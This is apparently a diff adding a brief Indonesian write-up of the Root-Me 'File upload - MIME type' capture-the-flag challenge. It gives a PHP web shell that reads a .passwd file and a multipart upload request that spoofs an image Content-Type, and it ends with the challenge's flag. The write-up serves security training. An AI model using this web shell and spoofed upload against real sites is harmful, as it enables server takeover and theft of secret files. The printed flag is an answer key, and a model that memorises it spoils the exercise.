@@ -1,0 +1,32 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch21
+	
+	Challenge's Name : File upload - MIME type
+	
+	Request : Your goal is to hack this photo galery by uploading PHP code. Retrieve the validation password in the file .passwd.
+	
+	Solusi :
+	
+	Buat file php dengan extensi nama_file.php.png / jpeg / gif
+	
+	<?php
+		$output = shell_exec('cat ../../../.passwd');
+		echo "<pre>$output</pre>";
+	?>
+	
+	Upload filetersebut pada link http://challenge01.root-me.org/web-serveur/ch21/?action=upload
+	modif dengan addon mozilla temper data
+	
+	POSTDATA =-----------------------------135722349310583
+	Content-Disposition: form-data; name="file"; filename="nama_file.php"
+	Content-Type: image/png
+
+	<?php
+	$output = shell_exec('cat ../../../.passwd');
+	echo "<pre>$output</pre>";
+	?>
+
+	-----------------------------135722349310583--
+	
+	Setelah diupload akan mendapatkan flag 
+	
+	Flag : UN2YusYPnmwfHFHI5zj3
